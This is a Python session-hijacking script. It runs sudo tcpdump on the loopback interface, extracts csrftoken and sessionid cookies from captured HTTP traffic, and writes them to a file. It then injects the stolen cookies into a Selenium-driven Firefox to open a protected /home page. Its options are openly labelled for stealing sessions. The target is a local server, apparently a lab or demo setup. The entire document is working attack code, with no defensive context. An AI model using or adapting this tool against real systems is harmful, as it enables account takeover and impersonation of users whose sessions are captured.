import argparse
import subprocess as sub
import selenium.webdriver
import re

import sys

host = '127.0.0.1'
port = '8000'
url = 'http://'+host+':'+port
secret_url = url + '/home'

def steal(open_browser, save_sessions, filename=None):
    p = sub.Popen(('sudo', 'tcpdump', '-A', '-i', 'lo', 'host', host), stdout=sub.PIPE)
    sessions = []
    tokens = []
    file = open(filename, 'a')
    for row in iter(p.stdout.readline, 'b'):
        line = str(row.rstrip())
        matchObj = re.search(r'csrftoken=(.*?); sessionid=(.*?)\'', line)
        if matchObj:
            id = matchObj.group(2)
            token = matchObj.group(1)
            if id not in sessions:
                if save_sessions:
                    sessions.append(id)
                    tokens.append(token)
                    file.write(id + "\t" + token + "\n")
                if open_browser:
                    driver = selenium.webdriver.Firefox()
                    driver.get(url)
                    driver.add_cookie({"name": "csrftoken", 'value': token})
                    driver.add_cookie({"name": "sessionid", 'value': id})
                    driver.get(secret_url)


def load(filename, lineno=-1):
    with open(filename, 'r') as f:
        lines = f.read().splitlines()
        line = lines[lineno].split('\t')
        id = line[0]
        token = line[1]
        driver = selenium.webdriver.Firefox()
        driver.get(url)
        driver.add_cookie({"name": "csrftoken", 'value': token})
        driver.add_cookie({"name": "sessionid", 'value': id})
        driver.get(secret_url)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--load", help="Load saved session from file.", action="store_true")
    parser.add_argument("--listen", help="Search for new session to steal.", action="store_true")
    parser.add_argument("--open", help="When session stolen open browser with it.", action="store_true")
    parser.add_argument("--save", help="Save session tokens to file.", action="store_true")
    parser.add_argument("--line", help="Number of line to read from file.", default=-1)
    parser.add_argument("--file", help="Path to file.", default="sessions.txt")

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)
    args = parser.parse_args()
    if args.load:
        load(args.file, args.line)
    if args.listen:
        steal(open_browser=args.open, save_sessions=args.save, filename=args.file)
